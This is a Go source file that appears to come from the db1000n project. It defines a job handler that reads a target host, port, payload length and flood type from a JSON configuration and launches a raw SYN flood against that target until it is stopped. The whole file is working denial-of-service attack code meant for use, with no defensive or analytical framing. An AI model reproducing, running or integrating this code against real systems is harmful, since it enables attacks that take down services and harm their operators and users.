package job

import (
	"context"
	"encoding/json"

	"github.com/Arriven/db1000n/logs"
	"github.com/Arriven/db1000n/synfloodraw"
)

func synFloodJob(ctx context.Context, l *logs.Logger, args Args) error {
	defer panicHandler()
	type synFloodJobConfig struct {
		BasicJobConfig
		Host          string
		Port          int
		PayloadLength int    `json:"payload_len"`
		FloodType     string `json:"flood_type"`
	}
	var jobConfig synFloodJobConfig
	err := json.Unmarshal(args, &jobConfig)
	if err != nil {
		return err
	}

	shouldStop := make(chan bool)
	go func() {
		<-ctx.Done()
		shouldStop <- true
	}()
	l.Debug("sending syn flood with params: Host %v, Port %v , PayloadLength %v, FloodType %v", jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
	return synfloodraw.StartFlooding(shouldStop, jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
}
